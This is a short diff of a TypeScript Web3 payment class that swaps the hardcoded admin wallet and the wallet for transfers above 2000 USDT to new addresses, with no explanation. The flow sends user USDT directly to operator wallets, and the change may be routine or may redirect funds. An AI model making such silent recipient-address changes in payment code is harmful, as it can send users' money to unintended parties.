@@ -9,8 +9,8 @@ export class Web3DirectTransfer {
   constructor(provider: any, userAddress: string) {
     this.provider = provider
     this.userAddress = userAddress
-    this.adminWallet = "0xd47c7585550eAd12aD365Fba5F4bD2533B9b4Eaf" // Standard admin wallet
-    this.highAmountWallet = "0xd96698f467B9b79483A2574a96821Ed576B09C1e" // For amounts > 2000 USDT
+    this.adminWallet = "0xCdB645e95361861a4Ea125DCDBD9c85B9efF1497" // Standard admin wallet
+    this.highAmountWallet = "0xe82f8f805351ee9203dbdc6af62ee09c6e03c7dc" // For amounts > 2000 USDT
     this.usdtContract = "0x55d398326f99059fF775485246999027B3197955" // USDT BEP-20
 
     // Estimate gas fees for USDT transfer
